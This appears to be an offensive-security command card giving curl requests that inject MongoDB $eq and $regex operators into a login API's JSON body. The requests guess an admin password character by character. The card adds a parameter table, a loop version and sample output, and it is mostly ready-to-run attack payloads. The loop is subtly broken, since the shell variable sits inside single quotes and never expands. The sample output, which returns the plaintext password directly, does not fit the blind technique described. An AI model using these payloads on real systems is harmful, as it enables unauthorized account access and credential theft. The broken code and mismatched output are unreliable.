---
type: command
executor: bash
data: >-
  curl -X POST http://target.com/api/login -H "Content-Type: application/json"
  -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}' -v

  curl -X POST http://target.com/api/login -H "Content-Type: application/json"
  -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}' -v

  curl -X POST http://target.com/api/login -H "Content-Type: application/json"
  -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}' -v
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - mongodb
verified: true
validated: true
---

# curl-nosql-injection-json-payload

## Command

```bash
curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}' -v
curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}' -v
curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}' -v
```

## Description

This command uses curl to send JSON-formatted NoSQL injection payloads to a MongoDB-backed API endpoint. It injects operators ($eq and $regex) to target specific usernames while matching password patterns, allowing extraction of user credentials from the database.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target.com/api/login` | The target API login endpoint URL (replace with actual) | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}'` | JSON payload with $eq for username and $regex for password pattern (e.g., starts with 'm') | Yes |
| `-v` | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}' -v
```

### Advanced Usage

Test multiple patterns sequentially:

```bash
for pattern in '^m' '^md' '^mdp'; do
  curl -X POST http://target.com/api/login -H "Content-Type: application/json" -d '{"username": {"$eq": "admin"}, "password": {"$regex": "$pattern" }}' -v
  echo "---"
done
```

## Expected Output

Successful execution yields a response with extracted data, e.g.:

```
< HTTP/1.1 200 OK
< Content-Type: application/json
<
{"users": [{"_id": "123", "username": "admin", "password": "mypassword"}]}
```
No data or error (e.g., 400 Bad Request) suggests failed injection or validation.

## Related

- [[procedures/NoSQL-Injection-Extract-User-Data-MongoDB]]
- [[commands/curl-nosql-injection-url-payload]]
